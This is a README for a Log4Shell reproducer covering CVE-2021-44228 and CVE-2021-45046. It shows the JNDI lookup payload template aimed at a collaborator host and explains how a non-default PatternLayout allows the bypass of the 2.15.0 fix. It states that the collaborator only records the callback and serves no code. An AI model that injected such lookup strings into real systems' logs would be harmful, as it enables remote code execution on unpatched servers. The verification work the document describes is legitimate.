# Case A driver — JNDI lookup RCE (CVE-2021-44228 / CVE-2021-45046)

> Authored but **not live-executed** this pass. The Dockerfiles and driver are
> correct in principle; the live Docker build + collaborator wiring is a TODO
> for the live pass (see repo-root `NOTES.md`).

## What it does

`CaseADriver` logs an attacker-controlled string of the form

```
${jndi:ldap://<collaborator-host>:<port>/poe-<token>}
```

through the pinned `log4j-core` version. If the JNDI lookup fires, log4j makes an
**outbound network callback** to the controlled collaborator carrying the
per-trial token.

## Observable side-effect

The **outbound JNDI callback to the collaborator** (network observability). The
collaborator (`reproducer/collaborator/`) only RECORDS the inbound connection and
the token — it never serves a Java class or any code-exec payload.

| Checkpoint | Version | Layout | Expected observable |
|---|---|---|---|
| `vulnerable` | 2.14.1 | default | callback fires → PoE |
| `failed_fix` | 2.15.0 | **non-default** (Context/Map lookup) | callback **still** fires → incomplete-patch, `conditional-on([non_default_pattern_layout])` |
| `real_fix` | 2.16.0 | non-default (same as failed_fix) | callback **dark** → PoNE |

## The 2.15.0 condition

2.15.0 disabled message lookups and restricted JNDI to localhost + an allowlist —
the advisory's first "fixed" version. The bypass (CVE-2021-45046) needs a
**non-default `PatternLayout`** that resolves a `${ctx:...}` Context/Map lookup on
attacker-controlled data. `log4j2-nondefault.xml` supplies exactly that layout,
and the driver routes the JNDI string through `ThreadContext` so the layout
lookup evaluates it. This is why the recorded precondition is
`non_default_pattern_layout` — a recorded condition on an otherwise `proven`
verdict, not a hedge.

## Effect-only stance (RFC 0003 / RFC 0001 inv. 8)

This reproducer demonstrates the **effect** (the outbound JNDI callback proving
the lookup fired), never the weaponization recipe. No malicious LDAP/HTTP class
is served; no remote code is executed. The collaborator is a passive recorder.
